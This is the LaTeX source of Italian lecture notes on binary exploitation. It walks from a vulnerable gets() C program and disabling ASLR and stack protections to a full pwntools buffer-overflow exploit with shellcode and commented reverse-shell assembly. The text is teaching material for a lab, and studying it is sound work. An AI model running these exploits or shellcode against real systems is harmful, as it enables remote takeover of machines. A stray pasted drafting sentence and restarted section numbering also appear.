@@ -1,0 +1,1033 @@
+\documentclass[11pt,a4paper]{article}
+
+% --- Packages ---
+\usepackage[margin=.75in]{geometry}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{lmodern} % Fix for font not found error
+\usepackage{titlesec}
+\usepackage{enumitem}
+\usepackage{hyperref}
+\usepackage{xcolor}
+\usepackage{fancyhdr}
+\usepackage{comment}
+\usepackage{cleveref}
+\usepackage[bottom]{footmisc}
+\usepackage{graphicx}
+\usepackage{longtable}
+\usepackage{booktabs}
+\usepackage{array}
+\usepackage{calc}
+\usepackage{etoolbox}
+
+% Standard Pandoc setup
+\providecommand{\tightlist}{%
+  \setlength{\itemsep}{0pt}\setlength{\parskip}{0pt}}
+
+\crefformat{section}{\S#2#1#3}
+\crefformat{subsection}{\S#2#1#3}
+\crefformat{subsubsection}{\S#2#1#3}
+\crefformat{figure}{#2Figure~#1#3}
+\crefformat{footnote}{#2\footnotemark[#1]#3}
+
+\linespread{0.9} % Riduce lo spazio tra le linee
+
+% --- Colors ---
+\definecolor{primary}{RGB}{0, 0, 0}
+\definecolor{links}{HTML}{0000EE}
+\definecolor{blue}{HTML}{26428B}
+
+\hypersetup{
+    colorlinks=true,
+    linkcolor=links,
+    urlcolor=links,
+    citecolor=links,
+}
+
+% --- Section Formatting ---
+\titleformat{\section}
+  {\normalfont\Large\bfseries\color{blue}}{\thesection}{1em}{}
+\titleformat{\subsection}
+{\normalfont\large\bfseries\color{blue}}{\thesubsection}{1em}{}
+\titleformat{\subsubsection}
+{\normalfont\bfseries\color{blue}}{\thesubsubsection}{1em}{}
+
+% --- Header and Footer ---
+\pagestyle{fancy}
+\fancyhead[L]{\small Giuseppe Capasso}
+\fancyhead[R]{\small vapt}
+\fancyfoot[C]{\thepage}
+\renewcommand{\headrulewidth}{0.4pt}
+
+% --- Custom Title Command ---
+\newcommand{\proposaltitle}[1]{
+    \begin{center}
+        \vspace*{0.1cm}
+        {\LARGE \bfseries \color{blue} #1} \\[1.5ex]
+        {\large \textbf{Giuseppe Capasso}} \\[1ex]
+                \small{
+            \vspace{0.1cm}
+            \textbf{Materia:} vapt\\
+        }
+            \end{center}
+    \vspace{0.3cm}
+    \hrule height 0.5pt
+    \vspace{0.5cm}
+}
+
+\begin{document}
+
+\proposaltitle{5. Architettura Avanzata: Shellcode di Rete ed Encoding}
+
+\subsection{1. Introduzione alla Binary
+Exploitation}\label{introduzione-alla-binary-exploitation}
+
+La \textbf{Binary Exploitation} (spesso definita \emph{pwn} in gergo
+hacker) è una branca della sicurezza offensiva che si concentra
+sull\textquotesingle individuazione e lo sfruttamento di vulnerabilità
+all\textquotesingle interno di file eseguibili (binari compilati).
+L\textquotesingle obiettivo principale di questa pratica non è alterare
+il codice sorgente, di cui spesso non disponiamo, ma manipolare il
+flusso di esecuzione del programma fornendo input malformati o
+inaspettati.
+
+Nel corso di queste lezioni, il nostro traguardo sarà ottenere
+l\textquotesingle{}\textbf{Arbitrary Code Execution (ACE)}. Sfrutteremo
+le debolezze di un binario per costringere il sistema a eseguire codice
+fornito da noi (chiamato \emph{shellcode}), con lo scopo finale di far
+spawnare una shell di sistema (locale o remota) che ci garantisca il
+controllo sul processo compromesso.
+
+\subsection{2. Architettura del Sistema e Gestione della
+Memoria}\label{architettura-del-sistema-e-gestione-della-memoria}
+
+Per poter sfruttare un binario, dobbiamo prima comprendere come il
+sistema operativo e la CPU gestiscono l\textquotesingle esecuzione di un
+processo in memoria. Lavoreremo principalmente su architetture x86
+(32-bit).
+
+\subsubsection{I Registri della CPU}\label{i-registri-della-cpu}
+
+La CPU esegue le istruzioni utilizzando una memoria interna ad altissima
+velocità composta dai \textbf{Registri}. Questi vengono utilizzati per
+memorizzare temporaneamente dati, indirizzi di memoria e lo stato
+dell\textquotesingle esecuzione. Ai fini
+dell\textquotesingle exploitation, il registro in assoluto più critico è
+l\textquotesingle{}\textbf{Instruction Pointer (RIP nei sistemi a
+64-bit, EIP nei 32-bit)}.
+
+\begin{itemize}
+\tightlist
+\item
+  Il registro \textbf{RIP} contiene in ogni istante
+  l\textquotesingle indirizzo di memoria della \emph{prossima
+  istruzione} che la CPU dovrà eseguire. Se riusciamo a prendere il
+  controllo del valore contenuto in RIP, possiamo deviare il flusso del
+  programma verso un indirizzo di nostra scelta (ad esempio, verso il
+  nostro shellcode).
+\end{itemize}
+
+\subsubsection{Layout della Memoria di un
+Processo}\label{layout-della-memoria-di-un-processo}
+
+Quando il sistema operativo carica un binario in memoria (RAM) per
+eseguirlo, assegna al processo uno spazio di indirizzamento virtuale
+segmentato in diverse aree specifiche. Le principali sono:
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  \textbf{Text (o Code):} Contiene le istruzioni macchina eseguibili del
+  programma. Questa sezione è tipicamente di sola lettura (Read-Only)
+  per prevenire la modifica accidentale o dolosa del codice durante
+  l\textquotesingle esecuzione.
+\item
+  \textbf{Data \& BSS:} Queste sezioni ospitano le variabili globali e
+  statiche. La sezione \emph{Data} contiene quelle inizializzate dal
+  programmatore, mentre la \emph{BSS} contiene quelle non inizializzate
+  (impostate a zero di default).
+\item
+  \textbf{Heap:} È l\textquotesingle area di memoria dedicata
+  all\textquotesingle allocazione dinamica (es. quando in C si
+  utilizzano funzioni come malloc() o calloc()). Viene utilizzata per
+  strutture dati la cui dimensione non è nota a tempo di compilazione.
+  Cresce tipicamente verso gli indirizzi di memoria più alti.
+\item
+  \textbf{Stack:} È la struttura di memoria fondamentale per la gestione
+  delle chiamate a funzione e delle variabili locali.
+
+  \begin{itemize}
+  \item
+    Lo Stack opera con una logica \textbf{LIFO} (\emph{Last In, First
+    Out}).
+  \item
+    Ogni volta che viene chiamata una funzione, viene creato un blocco
+    di memoria sullo stack chiamato \textbf{Stack Frame}.
+  \item
+    Lo Stack Frame contiene le variabili locali della funzione, i
+    parametri passati alla funzione e, soprattutto, il \textbf{Return
+    Address} (l\textquotesingle indirizzo a cui il programma deve
+    ritornare una volta terminata l\textquotesingle esecuzione della
+    funzione).
+  \item
+    Modificare illegalmente questo \emph{Return Address} sullo Stack è
+    la base dei classici attacchi di corruzione della memoria.
+  \end{itemize}
+\end{enumerate}
+
+\includegraphics[width=6.69306in,height=5.29444in]{media/image1.png}
+
+\subsection{3. Il Formato ELF}\label{il-formato-elf}
+
+Sui sistemi operativi Unix-like (come la distribuzione Kali Linux che
+utilizzeremo per i laboratori), lo standard per i file eseguibili, le
+librerie condivise e i core dump è il formato \textbf{ELF (Executable
+and Linkable Format)}. Un file ELF contiene non solo il codice macchina,
+ma anche una serie di header e tabelle che istruiscono il \emph{loader}
+del sistema operativo su come mappare il file nella memoria virtuale del
+processo, definendo i permessi (lettura, scrittura, esecuzione) per ogni
+segmento (Text, Data, ecc.).
+
+\includegraphics[width=3.4375in,height=3.8125in]{media/image2.png}
+
+\subsection{4. Vulnerabilità del linguaggio C: Il Buffer
+Overflow}\label{vulnerabilituxe0-del-linguaggio-c-il-buffer-overflow}
+
+La maggior parte dei sistemi operativi, dei demoni di rete e dei tool di
+sistema sono scritti in \textbf{C} o C++. Il C offre prestazioni elevate
+e un controllo a basso livello dell\textquotesingle hardware, ma manca
+di una caratteristica fondamentale presente in linguaggi più moderni: la
+\textbf{memory safety}.
+
+In C, la gestione della memoria è interamente delegata al programmatore.
+Il linguaggio non effettua alcun \emph{bounds checking} automatico
+(controllo dei limiti). Se allochiamo un array (buffer) di 10 byte e
+cerchiamo di scriverne 20, il C non solleverà
+un\textquotesingle eccezione a runtime bloccando
+l\textquotesingle operazione; scriverà semplicemente i 10 byte extra
+nelle locazioni di memoria contigue. Questo difetto strutturale causa il
+\textbf{Buffer Overflow}.
+
+\subsubsection{Analisi di un codice C
+vulnerabile}\label{analisi-di-un-codice-c-vulnerabile}
+
+Esaminiamo il seguente sorgente in C:
+
+C
+
+\#include \textless stdio.h\textgreater{}
+
+int main() \{
+
+// Allocazione di un buffer di 10 byte sullo Stack
+
+char buffer{[}10{]};
+
+printf("Inserisci l\textquotesingle input:\textbackslash n");
+
+// gets() legge da standard input fino a incontrare un newline
+
+gets(buffer);
+
+printf("Hai inserito: \%s\textbackslash n", buffer);
+
+return 0;
+
+\}
+
+\textbf{Analisi della vulnerabilità:} Il problema risiede
+nell\textquotesingle utilizzo della funzione di libreria standard
+gets(). Questa funzione è deprecata e considerata estremamente insicura
+poiché legge i dati dallo \emph{standard input} copiandoli nel buffer di
+destinazione senza effettuare alcun controllo sulla lunghezza dei dati
+immessi rispetto alla dimensione del buffer allocato.
+
+\begin{itemize}
+\item
+  \textbf{Esecuzione prevista:} L\textquotesingle utente fornisce una
+  stringa di 5 caratteri (es. Test1). La stringa viene inserita nel
+  buffer di 10 byte allocato nello Stack senza causare problemi.
+\item
+  \textbf{Exploitation:} L\textquotesingle utente fornisce un input di
+  30 caratteri (es. AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA). Poiché il buffer
+  buffer nello Stack è grande solo 10 byte, la funzione gets() scriverà
+  i primi 10 caratteri nel buffer, mentre i successivi 20 andranno a
+  sovrascrivere i dati adiacenti (indirizzi di memoria superiori)
+  all\textquotesingle interno dello Stack Frame.
+\end{itemize}
+
+Nello Stack, subito dopo le variabili locali, risiede il \textbf{Saved
+Return Address}. Sfruttando questo Buffer Overflow, possiamo calcolare
+l\textquotesingle esatto offset (la distanza) necessario per far sì che
+il nostro input sovrascriva proprio i byte che compongono
+l\textquotesingle indirizzo di ritorno. Quando la funzione main()
+terminerà (con return 0), la CPU andrà a leggere
+l\textquotesingle indirizzo di ritorno corrotto dallo Stack, lo
+caricherà nel registro \textbf{RIP}, e il flusso di esecuzione passerà
+sotto il nostro totale controllo.
+
+Strumenti utili per capire il funzionamento della memoria:
+
+\begin{itemize}
+\item
+  \url{https://circuitlabs.net/labs/c-stack-heap-memory-visualizer-learning-tool/}
+\item
+  \url{https://godbolt.org/}
+\item
+  \href{https://pythontutor.com/c.html}{\includegraphics[width=2.75139in,height=3.95833in]{media/image3.png}}https://pythontutor.com/c.html
+\end{itemize}
+
+\subsection{1. Il Target: Codice Vulnerabile e
+Compilazione}\label{il-target-codice-vulnerabile-e-compilazione}
+
+Il nostro bersaglio è un semplice programma in C che accetta un input
+dall\textquotesingle utente. La vulnerabilità risiede
+nell\textquotesingle utilizzo della funzione deprecata gets(), la quale
+non effettua alcun controllo sui limiti del buffer allocato.
+
+\subsubsection{Il Codice Sorgente
+(hello.c)}\label{il-codice-sorgente-hello.c}
+
+C
+
+\#include \textless stdio.h\textgreater{}
+
+\#include \textless string.h\textgreater{}
+
+void hello() \{
+
+char buffer{[}64{]};
+
+printf("Inserisci il tuo nome: ");
+
+// VULNERABILITÀ: Nessun controllo sulla dimensione
+dell\textquotesingle input
+
+gets(buffer);
+
+printf("Ciao, \%s!\textbackslash n", buffer);
+
+\}
+
+int main() \{
+
+hello();
+
+return 0;
+
+\}
+
+\subsubsection{Preparazione dell\textquotesingle Ambiente
+(Disabilitazione
+Protezioni)}\label{preparazione-dellambiente-disabilitazione-protezioni}
+
+Per scopi didattici e per comprendere le basi
+dell\textquotesingle exploitation, dobbiamo disabilitare le protezioni
+moderne introdotte dai sistemi operativi e dai compilatori.
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  \textbf{Disabilitare ASLR (Address Space Layout Randomization):}
+  L\textquotesingle ASLR randomizza gli indirizzi di memoria a ogni
+  esecuzione. Dobbiamo disabilitarla a livello di kernel per avere
+  indirizzi di memoria statici e predicibili.
+
+  Bash
+
+  sudo sysctl -w kernel.randomize\_va\_space=0
+\item
+  \textbf{Compilazione del Binario:} Utilizziamo gcc con flag specifici
+  per rimuovere le mitigazioni:
+
+  Bash
+
+  gcc -m32 -fno-stack-protector -z execstack -no-pie hello.c -o hello
+
+  \begin{itemize}
+  \item
+    -m32: Compila il binario per un\textquotesingle architettura a
+    32-bit (x86).
+  \item
+    -fno-stack-protector: Disabilita i "Canaries", i controlli di
+    integrità dello Stack.
+  \item
+    -z execstack: Rende lo Stack un\textquotesingle area di memoria
+    eseguibile (fondamentale per eseguire il nostro shellcode).
+  \item
+    -no-pie: Disabilita il Position Independent Executable.
+  \end{itemize}
+\end{enumerate}
+
+\subsection{2. Analisi Dinamica con pwndbg e De Bruijn
+Sequence}\label{analisi-dinamica-con-pwndbg-e-de-bruijn-sequence}
+
+Per analizzare il comportamento del programma in memoria, utilizzeremo
+\textbf{GDB} equipaggiato con l\textquotesingle estensione
+\textbf{pwndbg}, standard de facto per la binary exploitation.
+
+\subsubsection{Individuazione
+dell\textquotesingle Offset}\label{individuazione-delloffset}
+
+Sappiamo che inserendo più di 64 caratteri causeremo un Buffer Overflow.
+Tuttavia, dobbiamo scoprire il numero \emph{esatto} di byte necessari
+per raggiungere e sovrascrivere il registro \textbf{EIP} (Instruction
+Pointer), ovvero l\textquotesingle indirizzo di ritorno.
+
+Per farlo in modo ingegneristico, utilizziamo una \textbf{sequenza di De
+Bruijn} (un pattern ciclico in cui ogni blocco di 4 byte è univoco).
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  \textbf{Generiamo il pattern} tramite pwntools:
+
+  Bash
+
+  pwn cyclic 150
+
+  \emph{(Copia la stringa generata, es: aaaabaaacaaadaaa...)}
+\item
+  \textbf{Avviamo il debugger} e forniamo la stringa come input:
+
+  Bash
+
+  gdb ./hello
+
+  pwndbg\textgreater{} run
+
+  Incolla il pattern generato quando il programma richiede
+  l\textquotesingle input.
+\item
+  \textbf{Analisi del Crash (SIGSEGV):} Il programma crasherà.
+  Analizzando l\textquotesingle output di pwndbg, osserveremo il
+  registro EIP. Supponiamo di leggere EIP: 0x61616174 (che in ASCII
+  corrisponde a taaa). Questo significa che
+  l\textquotesingle Instruction Pointer è stato sovrascritto dalla
+  stringa taaa contenuta nel nostro pattern.
+\item
+  \textbf{Calcolo dell\textquotesingle Offset:} Chiediamo a pwntools a
+  quale posizione si trova quella specifica sottostringa:
+
+  Bash
+
+  pwn cyclic -l 0x61616174
+
+  Se l\textquotesingle output è \textbf{76}, significa che dobbiamo
+  inviare esattamente 76 byte di "spazzatura" (padding) prima di poter
+  scrivere il nuovo indirizzo di ritorno.
+\end{enumerate}
+
+\subsection{3. Struttura del Payload e il concetto di NOP
+Sled}\label{struttura-del-payload-e-il-concetto-di-nop-sled}
+
+L\textquotesingle obiettivo dell\textquotesingle exploit è iniettare del
+codice malevolo (Shellcode) nello Stack e costringere la CPU a
+eseguirlo. La struttura del nostro payload sarà la seguente:
+
+{[} Padding (76 byte) {]} + {[} Nuovo Indirizzo EIP (4 byte) {]} + {[}
+NOP Sled {]} + {[} Shellcode {]}
+
+\subsubsection{Cos\textquotesingle è il NOP
+Sled?}\label{cosuxe8-il-nop-sled}
+
+L\textquotesingle acronimo NOP sta per \emph{No Operation} (opcode 0x90
+in x86). È un\textquotesingle istruzione che dice alla CPU: "non fare
+nulla e passa all\textquotesingle istruzione successiva". Poiché
+l\textquotesingle indirizzo esatto in cui viene caricato il nostro
+buffer può variare leggermente tra l\textquotesingle ambiente di
+debugging e l\textquotesingle esecuzione reale (a causa delle variabili
+d\textquotesingle ambiente), calcolare al singolo byte
+l\textquotesingle indirizzo di destinazione è complesso.
+
+Il \textbf{NOP Sled} agisce come un "cuscinetto di atterraggio" o uno
+scivolo. Se il nostro nuovo EIP punta in un punto qualsiasi
+all\textquotesingle interno di questo scivolo di NOP, la CPU scorrerà su
+di essi senza fare nulla, fino ad arrivare inevitabilmente e in modo
+sicuro al nostro Shellcode.
+
+\subsection{4. Automazione dell\textquotesingle Attacco: Exploit in
+Python}\label{automazione-dellattacco-exploit-in-python}
+
+Per rendere l\textquotesingle attacco affidabile, scriveremo uno script
+in Python sfruttando pwntools. Invece di indovinare
+l\textquotesingle indirizzo dello stack, automatizzeremo un processo in
+due fasi: genereremo un crash controllato per leggere dal \emph{Core
+Dump} l\textquotesingle indirizzo esatto in cui risiedeva il registro
+\textbf{ESP}, e lo utilizzeremo come target per il nostro salto.
+
+\textbf{Prerequisito fondamentale:} Abilitare la generazione dei core
+dump nel terminale corrente:
+
+Bash
+
+ulimit -c unlimited
+
+\subsubsection{Lo Script Base (Shell
+Locale)}\label{lo-script-base-shell-locale}
+
+Questo script fornisce una shell sulla macchina su cui stiamo eseguendo
+il test.
+
+Python
+
+from pwn import *
+
+import os
+
+context.update(arch=\textquotesingle i386\textquotesingle,
+os=\textquotesingle linux\textquotesingle)
+
+context.log\_level = \textquotesingle error\textquotesingle{}
+
+print("{[}*{]} FASE 1: Provoco un crash per trovare lo Stack Pointer
+reale...")
+
+os.system("rm -f core*")
+
+p\_crash = process(\textquotesingle./hello\textquotesingle)
+
+p\_crash.sendline(b"A" * 150)
+
+p\_crash.wait()
+
+try:
+
+\# Leggiamo la memoria morta dal file generato dal crash
+
+core = p\_crash.corefile
+
+\# Estraiamo il valore di ESP al momento esatto del segfault
+
+real\_esp = core.esp
+
+print(f"{[}+{]} INDIRIZZO TROVATO: ESP = \{hex(real\_esp)\}")
+
+except Exception as e:
+
+print("{[}-{]} Impossibile leggere il core dump. Esegui
+\textquotesingle ulimit -c unlimited\textquotesingle.")
+
+exit()
+
+print("{[}*{]} FASE 2: Lancio dell\textquotesingle exploit...")
+
+context.log\_level = \textquotesingle info\textquotesingle{}
+
+p = process(\textquotesingle./hello\textquotesingle)
+
+offset = 76
+
+ret\_address = real\_esp \# Usiamo l\textquotesingle indirizzo appena
+calcolato
+
+\# Generazione shellcode base fornito da pwntools
+
+shellcode = asm(shellcraft.sh())
+
+\# Costruzione del payload con un NOP Sled di 32 byte
+
+payload = b"A" * offset
+
+payload += p32(ret\_address)
+
+payload += b"\textbackslash x90" * 32
+
+payload += shellcode
+
+p.sendline(payload)
+
+p.interactive()
+
+Ecco la stesura per la dispensa che copre la teoria
+dell\textquotesingle encoding e l\textquotesingle architettura a basso
+livello della reverse shell, spiegando esattamente \emph{perché} il
+nostro shellcode è dovuto cambiare rispetto all\textquotesingle attacco
+locale.
+
+\section{5. Architettura Avanzata: Shellcode di Rete ed
+Encoding}\label{architettura-avanzata-shellcode-di-rete-ed-encoding}
+
+Nel passaggio dall\textquotesingle esecuzione di una shell locale
+all\textquotesingle ottenimento di un accesso remoto (Reverse Shell), la
+complessità del nostro payload aumenta drasticamente. Non ci limitiamo
+più a chiedere al sistema operativo di "aprire un programma", ma
+dobbiamo manipolare lo stack di rete e l\textquotesingle infrastruttura
+di Input/Output del kernel Linux.
+
+Prima di analizzare il nuovo shellcode, è fondamentale comprendere una
+delle minacce strutturali più insidiose nello sviluppo degli exploit: i
+caratteri proibiti.
+
+\subsection{5.1 L\textquotesingle Invisibile Minaccia dei "Bad
+Characters" ed
+Encoding}\label{linvisibile-minaccia-dei-bad-characters-ed-encoding}
+
+Quando sfruttiamo vulnerabilità basate sull\textquotesingle immissione
+di stringhe (tramite funzioni come gets(), strcpy(), o scanf()), siamo
+soggetti alle regole sintattiche del linguaggio C.
+
+La funzione gets(), in particolare, è programmata per leggere dati dallo
+Standard Input fino a quando non si verifica una di queste due
+condizioni: incontra la fine del file (EOF) oppure incontra il carattere
+\textbf{Newline} (il "ritorno a capo" o tasto Invio). A livello
+macchina, il Newline corrisponde al byte esadecimale \textbf{0x0a}. Un
+altro carattere storicamente problematico per altre funzioni C è il
+\textbf{Null Byte} (\textbf{0x00}), che indica la terminazione di una
+stringa.
+
+Questi byte prendono il nome di \textbf{Bad Characters}.
+
+\subsubsection{Il Problema nello
+Shellcode}\label{il-problema-nello-shellcode}
+
+Lo shellcode non è testo, è codice macchina compilato (sequenze di byte
+esadecimali). Cosa succede se le istruzioni assembly che abbiamo scritto
+generano, per puro caso, il byte 0x0a? Nel momento in cui inviamo il
+payload, la funzione gets() inizierà a leggerlo e a scriverlo nello
+Stack. Appena incontrerà il byte 0x0a, presumerà che
+l\textquotesingle utente abbia premuto Invio. La funzione terminerà
+l\textquotesingle operazione in quell\textquotesingle istante, troncando
+il nostro payload a metà. L\textquotesingle indirizzo di ritorno non
+verrà sovrascritto correttamente o lo shellcode risulterà incompleto,
+causando un inevitabile \emph{Segmentation Fault}.
+
+\textbf{Perché non abbiamo riscontrato questo errore nei nostri test?}
+Nel nostro laboratorio abbiamo utilizzato l\textquotesingle indirizzo IP
+di loopback 127.0.0.1. Se la nostra macchina attaccante (es. Kali su
+VirtualBox) avesse avuto un IP come 10.0.2.15, la compilazione
+dell\textquotesingle indirizzo IP all\textquotesingle interno dello
+shellcode avrebbe generato il byte 0x0a (poiché 10 in decimale è 0x0a in
+esadecimale). In quello scenario, il nostro exploit sarebbe fallito
+silenziosamente.
+
+\subsubsection{La Soluzione: L\textquotesingle Encoding in
+Memoria}\label{la-soluzione-lencoding-in-memoria}
+
+Per eludere questo limite, i penetration tester utilizzano tecniche di
+\textbf{Encoding}. Invece di inviare lo shellcode puro,
+quest\textquotesingle ultimo viene "offuscato" (solitamente tramite
+un\textquotesingle operazione matematica di XOR) utilizzando una chiave
+che elimina fisicamente tutti i byte 0x0a e 0x00 dal payload.
+
+Tuttavia, la CPU non può eseguire codice offuscato. Pertanto,
+l\textquotesingle encoder aggiunge in testa al payload un piccolissimo
+programma chiamato \textbf{Decoder Stub} (privo di bad characters). Il
+flusso di esecuzione diventa il seguente:
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  L\textquotesingle EIP salta al nostro payload e inizia a eseguire il
+  Decoder Stub.
+\item
+  Il Decoder Stub legge il resto del payload dalla RAM, lo decifra in
+  tempo reale ripristinando i byte originali, e lo sovrascrive in
+  memoria.
+\item
+  Terminato il ciclo, il Decoder cede il controllo allo shellcode
+  decifrato, che viene eseguito normalmente.
+\end{enumerate}
+
+\subsection{5.2 Anatomia di una Reverse Shell su Linux: Oltre
+l\textquotesingle execve}\label{anatomia-di-una-reverse-shell-su-linux-oltre-lexecve}
+
+Per comprendere perché abbiamo dovuto scrivere istruzioni assembly
+aggiuntive per la Reverse Shell, dobbiamo analizzare le differenze
+architetturali rispetto a una shell locale.
+
+\subsubsection{La Shell Locale (Il limite del
+Terminale)}\label{la-shell-locale-il-limite-del-terminale}
+
+Nel nostro primo exploit, lo shellcode si limitava a invocare la
+\emph{System Call} (chiamata di sistema) execve("/bin/sh"). In Linux,
+ogni processo eredita i canali di comunicazione dal processo "padre".
+Quando il programma vulnerabile lancia /bin/sh,
+quest\textquotesingle ultima utilizza i canali standard (Tastiera e
+Monitor locale) per ricevere comandi e mostrare
+l\textquotesingle output. L\textquotesingle attaccante remoto avvia il
+programma, ma la shell rimane fisicamente intrappolata sul monitor della
+vittima.
+
+\subsubsection{Il Paradigma dei File
+Descriptor}\label{il-paradigma-dei-file-descriptor}
+
+In Linux vige una regola d\textquotesingle oro: \textbf{"Tutto è un
+file"}. Anche l\textquotesingle Input e l\textquotesingle Output del
+terminale sono trattati come file virtuali, identificati da un numero
+intero chiamato \textbf{File Descriptor (FD)}. Di default, ogni
+programma possiede tre FD primari:
+
+\begin{itemize}
+\item
+  \textbf{0 (Standard Input - STDIN):} Da dove legge i comandi.
+\item
+  \textbf{1 (Standard Output - STDOUT):} Dove stampa i risultati.
+\item
+  \textbf{2 (Standard Error - STDERR):} Dove stampa gli errori.
+\end{itemize}
+
+\subsubsection{Il nuovo Shellcode: Ristrutturare
+l\textquotesingle Input/Output}\label{il-nuovo-shellcode-ristrutturare-linputoutput}
+
+Per ottenere una Reverse Shell, dobbiamo alterare la fisiologia del
+sistema operativo. Non basta aprire una connessione di rete; dobbiamo
+costringere la nuova shell a usare la rete al posto della tastiera e del
+monitor.
+
+Il nostro nuovo shellcode è composto da tre fasi distinte, eseguite in
+sequenza millisecondi prima dell\textquotesingle avvio della shell:
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  \textbf{Creazione del Socket (connect):} Il nostro codice chiede al
+  kernel Linux di aprire una connessione TCP verso l\textquotesingle IP
+  dell\textquotesingle attaccante. Poiché in Linux anche i socket di
+  rete sono considerati file, il kernel assegna a questa nuova
+  connessione il primo File Descriptor disponibile. Essendo 0, 1 e 2 già
+  occupati, \textbf{la connessione di rete riceverà matematicamente il
+  File Descriptor 3}. \emph{(Il canale verso
+  l\textquotesingle attaccante è aperto, ma la shell non sa ancora di
+  doverlo usare).}
+\item
+  \textbf{Il Reindirizzamento (dup2):} Questa è la fase cruciale che
+  differenzia una Reverse Shell da un semplice payload. Utilizziamo la
+  System Call dup2 (Duplicate File Descriptor) per sovrascrivere
+  l\textquotesingle infrastruttura del processo. Istruiamo la CPU a
+  eseguire queste tre operazioni:
+
+  \begin{itemize}
+  \item
+    Copia il FD 3 (la Rete) e sovrascrivilo sul FD 0 (STDIN).
+  \item
+    Copia il FD 3 (la Rete) e sovrascrivilo sul FD 1 (STDOUT).
+  \item
+    Copia il FD 3 (la Rete) e sovrascrivilo sul FD 2 (STDERR).
+  \end{itemize}
+\item
+  \textbf{L\textquotesingle Esecuzione (execve):} Solo ora, con i "cavi"
+  virtuali scambiati, invochiamo execve("/bin/sh"). Quando la shell si
+  avvia, cercherà di leggere i comandi dallo STDIN e di stampare sullo
+  STDOUT. Senza saperlo, starà leggendo i pacchetti provenienti dalla
+  macchina dell\textquotesingle attaccante e starà inviando i risultati
+  dell\textquotesingle esecuzione attraverso il socket TCP, fino al
+  nostro listener Netcat. Abbiamo ottenuto il controllo remoto.
+\end{enumerate}
+
+Per comprendere a pieno la potenza e l\textquotesingle eleganza di
+questo attacco, dobbiamo scendere al livello
+dell\textquotesingle Assembly x86 (l\textquotesingle effettivo
+linguaggio macchina compreso dal processore).
+
+Sui sistemi Linux a 32-bit, l\textquotesingle interazione con il kernel
+(il cuore del sistema operativo) avviene tramite le \textbf{System
+Call}. Per invocare una System Call, dobbiamo preparare i registri della
+CPU secondo una convenzione ben precisa:
+
+\begin{itemize}
+\item
+  \textbf{EAX}: Contiene il numero identificativo della System Call (es.
+  11 per execve, 63 per dup2).
+\item
+  \textbf{EBX}: Contiene il primo argomento.
+\item
+  \textbf{ECX}: Contiene il secondo argomento.
+\item
+  \textbf{EDX}: Contiene il terzo argomento.
+\item
+  \textbf{int 0x80}: È l\textquotesingle istruzione di \emph{interrupt}
+  che dice alla CPU: "Sospendi il programma utente e passa il controllo
+  al Kernel con i parametri appena forniti".
+\end{itemize}
+
+Nello script Python precedente, abbiamo fuso macro preimpostate di
+pwntools (per comodità strutturale) con assembly crudo scritto da noi
+per il reindirizzamento dei File Descriptor.
+
+Esaminiamo e traduciamo il blocco Assembly che abbiamo iniettato nello
+Stack.
+
+\subsubsection{Il Codice Assembly
+Commentato}\label{il-codice-assembly-commentato}
+
+Snippet di codice
+
+/* FASE 1: Connessione TCP (Generata da shellcraft.connect) */
+
+/* Il kernel crea il socket. Essendo il primo file aperto dal
+
+nostro processo, gli viene assegnato il File Descriptor 3. */
+
+/* FASE 2: Il Reindirizzamento (Scritto manualmente da noi) */
+
+/* 2.1 Preparazione del target (Il nostro Socket) */
+
+mov ebx, 3 ; Mettiamo in EBX il primo argomento: il FD del Socket (3)
+
+/* 2.2 dup2(3, 0) - Reindirizziamo lo STDIN */
+
+mov al, 0x3f ; 0x3f è 63 in esadecimale (identificativo di dup2)
+
+xor ecx, ecx ; Un modo elegante per impostare ECX a 0 (STDIN)
+
+int 0x80 ; Eseguiamo la System Call
+
+/* 2.3 dup2(3, 1) - Reindirizziamo lo STDOUT */
+
+mov al, 0x3f ; Ricarichiamo 63 in EAX (AL)
+
+mov cl, 1 ; Mettiamo 1 in ECX (STDOUT)
+
+int 0x80 ; Eseguiamo la System Call
+
+/* 2.4 dup2(3, 2) - Reindirizziamo lo STDERR */
+
+mov al, 0x3f ; Ricarichiamo 63 in EAX (AL)
+
+mov cl, 2 ; Mettiamo 2 in ECX (STDERR)
+
+int 0x80 ; Eseguiamo la System Call
+
+/* FASE 3: L\textquotesingle Esecuzione (Generata da shellcraft.sh) */
+
+/* A questo punto, pwntools genera l\textquotesingle assembly per
+eseguire
+
+sys\_execve("/bin/sh", NULL, NULL). L\textquotesingle output e
+l\textquotesingle input di
+
+questa shell viaggeranno ora attraverso il FD 3. */
+
+\subsubsection{L\textquotesingle Arte di evitare i Bad Characters in
+Assembly}\label{larte-di-evitare-i-bad-characters-in-assembly}
+
+Se osserviamo attentamente il codice Assembly che abbiamo scritto per la
+Fase 2, noteremo delle scelte stilistiche particolari. Questa è
+l\textquotesingle essenza dello sviluppo di exploit (Exploit
+Development).
+
+\textbf{Perché non abbiamo usato istruzioni standard come mov eax, 63 o
+mov ecx, 0?}
+
+La risposta risiede nei \emph{Bad Characters} analizzati nel capitolo
+precedente. Se scrivessimo mov eax, 63 (che in esadecimale è 0x3f), il
+compilatore Assembly, sapendo che EAX è un registro a 32-bit (4 byte),
+tradurrebbe l\textquotesingle istruzione in linguaggio macchina
+riempiendo gli spazi vuoti con degli zeri: B8 3F 00 00 00
+
+Questa sequenza contiene ben tre \textbf{Null Byte} (0x00). Come
+sappiamo, la funzione gets() del nostro programma C vulnerabile si
+fermerebbe al primo 0x00, troncando il nostro shellcode e facendo
+fallire l\textquotesingle attacco.
+
+Per aggirare questo ostacolo, abbiamo utilizzato \textbf{tecniche di
+ottimizzazione Assembly (Shellcoding):}
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  \textbf{Uso dei registri a 8-bit (AL, CL):} Invece di interagire con
+  l\textquotesingle intero registro EAX (32-bit), abbiamo usato mov al,
+  0x3f. AL rappresenta solo gli ultimi 8 bit (1 byte) del registro EAX.
+  Modificando solo quell\textquotesingle ottetto,
+  l\textquotesingle istruzione compilata risulta essere semplicemente B0
